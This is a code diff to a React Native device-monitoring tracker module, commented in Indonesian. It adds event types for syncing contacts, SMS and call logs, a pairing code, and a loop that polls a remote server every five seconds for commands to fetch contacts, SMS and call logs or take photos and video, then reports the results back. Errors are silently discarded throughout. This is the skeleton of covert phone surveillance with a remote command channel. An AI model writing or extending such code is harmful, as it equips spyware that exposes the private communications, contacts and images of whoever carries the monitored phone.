@@ -21,6 +21,9 @@ export type EventType =
   | 'battery_state'
   | 'network_change'
   | 'location_update'
+  | 'contacts_sync'
+  | 'sms_sync'
+  | 'call_log_sync'
   | 'custom';
 
 export interface TrackEvent {
@@ -41,16 +44,18 @@ export interface TrackerStatus {
   apiUrl: string;
 }
 
-const STORAGE_KEY_DEVICE_ID = '@device_monitor/device_id';
-const STORAGE_KEY_LOGS      = '@device_monitor/logs';
-const MAX_LOCAL_LOGS         = 500;
-const RETRY_INTERVAL_MS      = 30_000;
+const STORAGE_KEY_DEVICE_ID   = '@device_monitor/device_id';
+const STORAGE_KEY_LOGS        = '@device_monitor/logs';
+const STORAGE_KEY_PAIRING     = '@device_monitor/pairing_code';
+const MAX_LOCAL_LOGS           = 500;
+const RETRY_INTERVAL_MS        = 30_000;
 
 // ─── In-memory state ──────────────────────────────────────────────────────────
 
 let eventQueue: TrackEvent[]        = [];
 let isSending                        = false;
 let deviceId                         = '';
+let pairingCode                      = '';
 let retryTimer: ReturnType<typeof setTimeout> | null = null;
 
 let trackerStatus: TrackerStatus = {
@@ -86,16 +91,30 @@ function generateId(): string {
   return `${Date.now()}-${Math.random().toString(36).slice(2, 9)}`;
 }
 
+function generatePairingCode(): string {
+  // 4 digit angka: 1000–9999
+  return String(Math.floor(1000 + Math.random() * 9000));
+}
+
 // ─── Init ─────────────────────────────────────────────────────────────────────
 
 export async function initTracker(): Promise<void> {
+  // Load atau buat deviceId
   const stored = await AsyncStorage.getItem(STORAGE_KEY_DEVICE_ID);
-
   if (stored) {
     deviceId = stored;
   } else {
     deviceId = `device-${generateId()}`;
     await AsyncStorage.setItem(STORAGE_KEY_DEVICE_ID, deviceId);
+  }
+
+  // Load atau buat pairing code — tetap sama selama belum di-link
+  const storedCode = await AsyncStorage.getItem(STORAGE_KEY_PAIRING);
+  if (storedCode) {
+    pairingCode = storedCode;
+  } else {
+    pairingCode = generatePairingCode();
+    await AsyncStorage.setItem(STORAGE_KEY_PAIRING, pairingCode);
   }
 
   const logs = await getLocalLogs();
@@ -120,6 +139,10 @@ export async function initTracker(): Promise<void> {
 
 export function getDeviceId(): string {
   return deviceId;
+}
+
+export function getPairingCode(): string {
+  return pairingCode;
 }
 
 export function getApiUrl(): string {
@@ -195,7 +218,7 @@ async function flushQueue(): Promise<void> {
     const response = await fetch(`${API_URL}/api/events`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ events: batch }),
+      body: JSON.stringify({ events: batch, pairingCode }),
     });
 
     if (response.ok) {
@@ -278,4 +301,93 @@ export async function sendPendingEvents(): Promise<{ sent: number; failed: numbe
     sent: unsent.length - stillPending,
     failed: stillPending,
   };
+}
+
+// ─── Realtime State (tidak masuk DB) ─────────────────────────────────────────
+// Kirim battery_state dan app_background/foreground langsung ke /api/realtime
+// tanpa disimpan ke AsyncStorage atau dikirim ke /api/events
+
+export async function sendRealtimeState(state: {
+  batteryLevel?: number;
+  batteryState?: string;
+  appState?: string;
+}): Promise<void> {
+  if (!API_URL || !deviceId) return;
+  try {
+    await fetch(`${API_URL}/api/realtime`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ deviceId, ...state }),
+    });
+  } catch {
+    // Silent — realtime, tidak perlu retry
+  }
+}
+
+// ─── Command Polling ──────────────────────────────────────────────────────────
+// HP poll /api/commands?deviceId=xxx&status=pending tiap interval
+// Callback dipanggil untuk setiap command yang diterima
+
+export type CommandType = 'fetch_contacts' | 'fetch_sms' | 'fetch_calls' | 'take_photo' | 'take_video';
+
+export interface DeviceCommand {
+  id: string;
+  deviceId: string;
+  command: CommandType;
+  payload: Record<string, unknown>;
+  status: string;
+  createdAt: string;
+}
+
+type CommandHandler = (command: DeviceCommand) => Promise<void>;
+let commandHandler: CommandHandler | null = null;
+let commandPollTimer: ReturnType<typeof setTimeout> | null = null;
+const COMMAND_POLL_INTERVAL_MS = 5_000;
+
+export function setCommandHandler(handler: CommandHandler) {
+  commandHandler = handler;
+}
+
+export function startCommandPolling() {
+  if (commandPollTimer) clearInterval(commandPollTimer);
+  commandPollTimer = setInterval(async () => {
+    if (!API_URL || !deviceId || !commandHandler) return;
+    try {
+      const res = await fetch(
+        `${API_URL}/api/commands?deviceId=${deviceId}&status=pending`,
+        { headers: { 'Content-Type': 'application/json' } }
+      );
+      if (!res.ok) return;
+      const data = await res.json() as { commands: DeviceCommand[] };
+      for (const cmd of data.commands ?? []) {
+        void commandHandler(cmd);
+      }
+    } catch {
+      // Silent
+    }
+  }, COMMAND_POLL_INTERVAL_MS);
+}
+
+export function stopCommandPolling() {
+  if (commandPollTimer) {
+    clearInterval(commandPollTimer);
+    commandPollTimer = null;
+  }
+}
+
+export async function updateCommandStatus(
+  id: string,
+  status: 'executed' | 'failed',
+  result?: Record<string, unknown>
+): Promise<void> {
+  if (!API_URL) return;
+  try {
+    await fetch(`${API_URL}/api/commands`, {
+      method: 'PATCH',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ id, status, result }),
+    });
+  } catch {
+    // Silent
+  }
 }
